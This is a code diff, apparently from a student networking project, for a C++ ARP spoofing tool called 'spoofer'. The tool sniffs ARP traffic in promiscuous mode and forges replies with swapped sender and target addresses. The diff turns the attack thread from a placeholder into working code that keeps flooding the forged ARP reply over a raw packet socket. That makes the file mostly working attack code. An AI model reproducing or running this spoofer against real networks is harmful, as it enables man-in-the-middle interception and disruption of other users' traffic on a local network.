@@ -2,11 +2,14 @@
 #include <sys/ioctl.h>
 #include <unistd.h>
 
+#include <arpa/inet.h>          // manipulação de endereços IP
+#include <linux/if_ether.h>
+#include <net/ethernet.h>
 #include <net/if.h>             // ifr struct
 #include <netinet/ether.h>      // header ethernet
 #include <netinet/in.h>         // protocol definitions
-#include <arpa/inet.h>          // manipulação de endereços IP
 #include <netinet/in_systm.h>   // tipos de dados (???)
+#include <netpacket/packet.h>
 
 #include <csignal>
 #include <cstring>
@@ -27,27 +30,78 @@ void SIGINTHandler(int);
 std::mutex runMutex;
 int run = 1;
 
-void attack(const Arp& reply)
+void attack(int socket, int ivalue, const Arp reply)
 {
   Ethernet ethernet;
   memcpy(ethernet.destination, reply.targetHAddr, HLEN);
   memcpy(ethernet.source, reply.senderHAddr, HLEN);
   ethernet.etherType = 0x0806;
 
+  int size = 0;
+  BYTE buff[BUFFSIZE];
+  size += ethernet.ToBuffer(&buff[0]);
+  size += reply.ToBuffer(&buff[15]);
+
   std::cout << red << "Hello from thread ATTACK!" << reset << std::endl;
   std::cout << ethernet.ToString() << std::endl;
   std::cout << reply.ToString() << std::endl;
+
+  struct sockaddr_ll destAddr;
+  destAddr.sll_family = htons(PF_PACKET);
+  destAddr.sll_protocol = htons(ETH_P_ALL);
+  destAddr.sll_halen = HLEN;
+  destAddr.sll_ifindex = ivalue;
+  memcpy(&(destAddr.sll_addr), ethernet.destination, HLEN);
   
-  while(run)
+  while (run)
   {
     runMutex.lock();
-    std::cout << yellow << '.' << reset;
+    int ret;
+    if ((ret = sendto(socket, buff, size, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
+			error();
+			return;
+    }
     runMutex.unlock();
   }
 }
 
 int main(int argc, char** argv)
 {
+  /*BYTE xxx[HLEN] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05 };
+  BYTE yyy[HLEN] = { 0x10, 0x11, 0x12, 0x13, 0x14, 0x15 };
+  BYTE www[PLEN] = { 0xFF, 0xFE, 0xFD, 0xFC };
+  BYTE zzz[PLEN] = { 0xAA, 0xAB, 0xAC, 0xAD };
+
+  Ethernet ethernet;
+  memcpy(&ethernet.destination, &xxx, HLEN);
+  memcpy(&ethernet.source, &yyy, HLEN);
+  ethernet.etherType = 0x0806;
+
+  Arp arpx;
+  arpx.hType = 0x0102;
+  arpx.pType = 0x0304;
+  arpx.hLen  = 0x5;
+  arpx.pLen = 0x06;
+  arpx.operation = 0x0708;
+  memcpy(&arpx.senderHAddr, &xxx, HLEN);
+  memcpy(&arpx.senderPAddr, &www, PLEN);
+  memcpy(&arpx.targetHAddr, &yyy, HLEN);
+  memcpy(&arpx.targetPAddr, &zzz, PLEN);
+
+  std::cout << ethernet.ToString() << std::endl << arpx.ToString() << std::endl;
+
+  int size = 0;
+  BYTE buffx[BUFFSIZE];
+  size += ethernet.ToBuffer(&buffx[0]);
+  size += arpx.ToBuffer(&buffx[size]);
+
+  for (int i = 0; i < size; i++)
+  {
+    std::cout << "[" << std::hex << (int)buffx[i] << "]";
+  }
+
+  std::cout << std::endl;*/
+
   if (argc != 2)
   {
     std::cerr << "Usage: spoofer <interface>" << std::endl;
@@ -139,11 +193,11 @@ int main(int argc, char** argv)
   ok();
   std::cout << std::endl << blue << "Capturing interface " << ifr.ifr_name << " (" << MACToStr(intMac) << " :: " << IPToStr(intIp) << ")..." << reset << std::endl;
  
-	unsigned char buff[BUFFSIZE];
+	BYTE buff[BUFFSIZE];
 
   while (run) 
   {
-    recv(sockd,(char *) &buff, sizeof(buff), 0x00);
+    recv(sockd, (char *) &buff, sizeof(buff), 0x00);
 
     Ethernet ethernet(&buff[0]);
 
@@ -167,15 +221,17 @@ int main(int argc, char** argv)
         memcpy(reply.targetPAddr, reply.senderPAddr, PLEN);
         memcpy(reply.senderPAddr, ipSwap, PLEN);
 
-        attackThread = new std::thread(attack, reply);
+        attackThread = new std::thread(attack, sockd, ifr.ifr_ifindex, reply);
         break;
       }
     }
 	}
 
-  std::cout << yellow << "Waiting for attack thread to terminate..." << reset << std::endl;
-
-  attackThread->join();
+  if (attackThread != nullptr)
+  {
+    std::cout << yellow << "Waiting for attack thread to terminate..." << reset << std::endl;
+    attackThread->join();
+  }
 
 	ifr.ifr_flags &= ~IFF_PROMISC;  
   std::cout << "Unset interface from PROMISCUOUS mode...";
